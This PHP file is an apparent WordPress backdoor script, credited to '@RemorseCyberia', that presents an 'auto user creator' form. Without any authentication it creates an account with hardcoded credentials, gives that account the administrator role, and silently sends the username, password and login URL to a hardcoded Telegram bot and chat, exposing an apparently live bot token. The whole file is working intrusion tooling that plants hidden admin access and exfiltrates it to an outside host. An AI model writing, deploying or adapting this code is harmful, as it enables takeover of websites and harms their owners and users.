<?php
// Load WordPress environment
require_once('wp-config.php');
require_once('wp-load.php');

// Telegram Bot Configuration
$telegram_bot_token = '8360743485:AAF1ZRbeG6Z6UzSnRxD_FyS9ep4ukkKvtlk'; // Replace with your bot token
$telegram_chat_id = '1377200203';   // Replace with your chat ID

// HTML form to get user input for email
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo '<h2 style="text-align: center;">AUTO WORDPRESS USER CREATOR</h2>';
    echo '<form method="POST" style="text-align: center; margin-top: 20%;">';
    echo '<label for="email">Enter Email: </label>';
    echo '<input type="email" id="email" name="email" required style="margin: 10px; padding: 5px;">';
    echo '<button type="submit" style="padding: 5px 10px;">Go</button>';
    echo '</form>';
        echo '<p style="text-align: center; margin-top: 10px;">Script By @RemorseCyberia</p>';
    exit;
}

// Collect email input from form
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);

if (!$email) {
    echo '<script>alert("Invalid email address.");</script>';
    exit;
}

// Username and Password configuration
$username = '4rum1337';
$password = '4rum1337';

if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
        echo '<script>alert("Error: Unable to create user.");</script>';
    } else {
        // Set the new user role to Administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        // Send login details to Telegram silently
        $login_url = wp_login_url();
        $message = "New WordPress User Created:\nUsername: $username\nPassword: $password\nLogin URL: $login_url";
        $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
        $post_data = [
            'chat_id' => $telegram_chat_id,
            'text' => $message
        ];

        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($post_data),
            ],
        ];

        $context = stream_context_create($options);
        file_get_contents($telegram_url, false, $context);

        // Show success message
        echo '<script>alert("Success to Create\nUsername: ' . $username . '\nPassword: ' . $password . '");</script>';

        // Redirect to WordPress login page
        echo '<script>window.location.href = "' . $login_url . '";</script>';
    }
} else {
    $existing_user = get_user_by('login', $username);
    if ($existing_user) {
        $login_url = wp_login_url();
        echo '<script>alert("User already exists.\nUsername: ' . $username . '\nPassword: (hidden for security)\nRedirecting to login page.");</script>';
        echo '<script>window.location.href = "' . $login_url . '";</script>';
    } else {
        echo '<script>alert("User already exists with this email.");</script>';
    }
}
?>